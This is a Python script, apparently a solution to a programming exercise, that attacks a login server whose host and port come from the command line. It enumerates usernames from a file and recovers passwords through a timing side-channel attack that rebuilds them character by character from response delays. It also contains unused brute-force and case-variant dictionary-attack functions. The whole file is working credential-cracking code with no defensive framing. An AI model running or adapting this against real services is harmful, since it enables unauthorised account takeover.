# write your code here
import os
import socket
import sys
import string
import itertools
import json
import time

arguments = sys.argv

possible_symbols = list(string.ascii_lowercase + "0" + "1" + "2" + "3" + "4" + "5" + "6" + "7" + "8" + "9" + string.ascii_uppercase)


def brute_force_password():
    for i in range(1, 4):
        combinations = itertools.product(possible_symbols, repeat=i)

        for _tuple in combinations:
            password = ""
            for temp in _tuple:
                password = password + temp
            client_socket.send(str(password).encode())
            response = client_socket.recv(1024)

            if response.decode() != "Wrong password!":
                print(password)


def find_password_with_dict():
    with open("passwords.txt", "r") as password_file:
        passwords = password_file.read()
        passwords = passwords.split("\n")
        for password in passwords:
            if any(char.isdigit() for char in password):
                client_socket.send(str(password).encode())
                response = client_socket.recv(1024)
                if response.decode() != "Wrong password!":
                    print(password)
            else:
                generated_passwords = map(lambda x: ''.join(x),
                                          itertools.product(*([letter.lower(), letter.upper()] for letter in password)))
                for generated_password in generated_passwords:
                    client_socket.send(generated_password.encode())
                    response = client_socket.recv(1024)

                    if response.decode() != "Wrong password!":
                        print(generated_password)
                        sys.exit()


with socket.socket() as client_socket:
    client_socket.connect((arguments[1], int(arguments[2])))
    with open("logins.txt", "r") as login_file:
        logins = login_file.read()
        logins = logins.split("\n")

    for login in logins:
        login_dict = {"login": login,
                      "password": " "}
        login_dict_json = json.dumps(login_dict)
        client_socket.send(login_dict_json.encode())
        response = client_socket.recv(1024)
        response = response.decode()
        response = json.loads(response)
        if response["result"] == "Wrong password!":
            found = False
            password = ""

            while not found:
                for symbol in possible_symbols:
                    password = password + symbol
                    login_dict = {"login": login,
                                  "password": password}
                    login_dict_json = json.dumps(login_dict)
                    start = time.perf_counter()
                    client_socket.send(login_dict_json.encode())
                    response = client_socket.recv(1024)
                    end = time.perf_counter()
                    working_time = end - start
                    response = response.decode()
                    response = json.loads(response)
                    #print(login_dict_json)
                    #print(response)
                    #print(working_time)

                    if response["result"] == "Wrong password!" and working_time < 0.1:
                        password = password[:-1]
                    if response["result"] == "Connection success!":
                        print(login_dict_json)
                        sys.exit()


